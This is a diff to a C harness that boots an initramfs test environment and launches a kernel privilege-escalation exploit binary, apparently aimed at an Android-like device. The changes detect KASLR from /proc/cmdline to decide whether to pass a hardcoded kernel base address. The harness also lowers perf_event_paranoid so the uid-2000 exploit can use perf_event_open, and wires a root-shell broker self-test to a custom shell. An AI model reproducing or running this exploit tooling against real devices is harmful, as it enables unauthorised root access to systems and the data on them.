@@ -53,6 +53,22 @@ int main(void) {
   mkdir("/data/local", 0755);
   mkdir("/data/local/tmp", 0777); /* the exploit runs as uid 2000 */
 
+  /* nokaslr (our default) means the runtime _stext is the link address, so we
+     can pin it and skip the perf leak; with KASLR on we must not, or every
+     image-relative target would be off by the slide.  There is no way to read
+     the slide from here, so just decide whether to pass --kaslr-base at all. */
+  int nokaslr = 0;
+  int cf = open("/proc/cmdline", O_RDONLY);
+  if (cf >= 0) {
+    char cbuf[512];
+    ssize_t cn = read(cf, cbuf, sizeof(cbuf) - 1);
+    close(cf);
+    if (cn > 0) {
+      cbuf[cn] = 0;
+      nokaslr = strstr(cbuf, "nokaslr") != NULL;
+    }
+  }
+
   /* Device analogue: perf_event_paranoid=-1 lets unprivileged shells use
      perf_event_open (the GOT-W29 device runs with -1 too). */
   int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_WRONLY);
@@ -133,16 +149,30 @@ int main(void) {
       }
       char *argv[20];
       int ai = 0;
+      int want_shell = 0, have_shell = 0;
+      for (int k = 0; k < gwords[gi]; k++) {
+        want_shell |= strcmp(groups[gi][k], "--su-selftest") == 0;
+        have_shell |= strcmp(groups[gi][k], "--shell") == 0;
+      }
       argv[ai++] = "/ghostlock_exe";
       argv[ai++] = "--probe-cycle";
       argv[ai++] = "--no-rt";
       for (int k = 0; k < gwords[gi]; k++) {
         argv[ai++] = groups[gi][k];
       }
+      /* The initramfs has no /system/bin/sh; --su-selftest drives the broker's
+         generic command path too, so point it at glsh unless the caller chose
+         a shell itself. */
+      if (want_shell && !have_shell && access("/glsh", X_OK) == 0) {
+        argv[ai++] = "--shell";
+        argv[ai++] = "/glsh";
+      }
       argv[ai++] = "--attempts";
       argv[ai++] = "4";
-      argv[ai++] = "--kaslr-base";
-      argv[ai++] = "0xffffff8008080800";
+      if (nokaslr) {
+        argv[ai++] = "--kaslr-base";
+        argv[ai++] = "0xffffff8008080800";
+      }
       argv[ai++] = "--log-file";
       argv[ai++] = "/dev/kmsg";
       argv[ai] = NULL;
